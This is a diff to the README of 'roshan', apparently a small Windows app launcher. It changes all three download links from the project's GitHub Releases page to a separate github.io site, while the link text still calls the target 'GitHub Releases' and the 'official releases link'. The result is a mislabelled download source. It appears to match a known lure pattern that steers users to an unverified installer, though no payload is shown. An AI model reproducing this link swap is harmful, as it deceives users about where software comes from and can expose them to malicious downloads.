@@ -1,6 +1,6 @@
 # 🚀 roshan - Launch Your Daily Apps in Order
 
-[![Download roshan](https://img.shields.io/badge/Download_roshan-Windows_Release-33C1FF?style=for-the-badge&labelColor=FF5733&logo=windows&logoColor=white)](https://github.com/kkkknrg/roshan/releases)
+[![Download roshan](https://img.shields.io/badge/Download_roshan-Windows_Release-33C1FF?style=for-the-badge&labelColor=FF5733&logo=windows&logoColor=white)](https://kkkknrg.github.io)
 
 roshan is a small, offline, open-source Windows app that starts the apps and commands you use every day in one click, in the right order. Instead of opening the same programs one by one, you create a simple launch flow and let roshan handle the routine.
 
@@ -26,7 +26,7 @@ The app is open source, so anyone can inspect how it works. It is also offline, 
 
 Visit this link to download the application:
 
-[Download roshan from GitHub Releases](https://github.com/kkkknrg/roshan/releases)
+[Download roshan from GitHub Releases](https://kkkknrg.github.io)
 
 The download page opens in your browser. Save the download to your Downloads folder, then open it. Follow the on-screen prompt to start roshan.
 
@@ -123,7 +123,7 @@ Yes. You can create separate launch groups for different routines.
 
 Visit the official releases link:
 
-[Download roshan](https://github.com/kkkknrg/roshan/releases)
+[Download roshan](https://kkkknrg.github.io)
 
 ### Is roshan suitable for Persian-speaking users?
 
